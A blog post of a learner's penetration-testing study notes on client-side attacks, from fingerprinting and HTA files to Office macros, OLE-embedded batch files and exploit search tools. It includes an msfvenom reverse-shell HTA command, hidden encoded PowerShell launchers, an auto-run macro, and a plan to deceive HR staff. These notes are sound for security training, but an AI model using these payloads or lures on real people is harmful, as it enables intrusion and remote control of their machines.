---
title: Study Notes - 2021/03/21
date: 2021-03-21 02:01:55
tags: [Penetration Testing, Study Notes]
---

# Client-side Attack 

## Passive Client information Gathering  
Googled for various known external corporate IP addresses and found one on a site that hosts collected user agent data from various affiliate sites.

## Active Client information Gathering  
## Social engineering and client-side attacks 
Cheat HR, by sending their a document, and ask what types of os and broseswer they are using 

## Client Fingerprinting  
fingerpringjs  

use ajax to post components array to the server  

sudo chown www-data:www-data fp  

## Leveraging HTML Applications 
If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically nterpret it as a HTML Application and offer the ability to execute it using the mshta.exe program.

work with IE 

Similar to an HTML page, a typical HTML Application includes html, body, and script tags followed by JavaScript or VBScript code. However, since the HTML Application is executed outside the browser we are free to use legacy and dangerous features that are often blocked within the browser  

An additional window will open, add close 

``
<html>
<head>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>
self.close();
</script>
</body>
</html>
``

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```
```
iKqr8BWFyuiK.Run "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg
```

-nop no profile  
-w hidden do not pop up a window  
-EncodedCommand  -e  

# Microsoft macros

```
Sub AutoOpen()
MyMacro
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub MyMacro()
CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

We must save the containing document as either .docm or the older .doc format, which supports
embedded macros, but must avoid the .docx format, which does not support them.


# Object Linking and Emedding
Insert batch object into a word file  
change the present, display as icon, change the icon   
Can also change caption  
user need to click on the icon to lanuch the batch file  

START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....  

# Evading Protected View  
block the execution of macro and embeded object  
bypass is to use another Office application.  


# Locating public exploits 
https://www.exploit-db.com  
  
https://www.securityfocus.com  
A vulnerability database instead of exploit database, reference may contain some PoC 

https://packetstormsecurity.com  
It provides up-to-date information on security news and vulnerabilities as well as recently published tools by security vendors

```
firefox --search "Microsoft Edge site:exploit-db.com"
```
inurl intext and intitle  

# Offline exploit resource  
SearchSploit  
```
sudo apt update && sudo apt install exploitdb
```
to make sure it is lateset  

/usr/share/exploitdb/exploits/  


# nmap NSE script 
kali@kali:~$ cd /usr/share/nmap/scripts  
kali@kali:/usr/share/nmap/scripts$ grep Exploits *.nse  
nmap --script-help=clamav-exec.nse  

# The Browser Exploitation Framework (BeEF)
# Metasploit Framework 


# Put all together 
```
sudo nmap 10.11.0.128 -p- -sV -vv --open --reason
```
  --open: Only show open (or possibly open) ports  
  --reason: Display the reason a port is in a particular state  


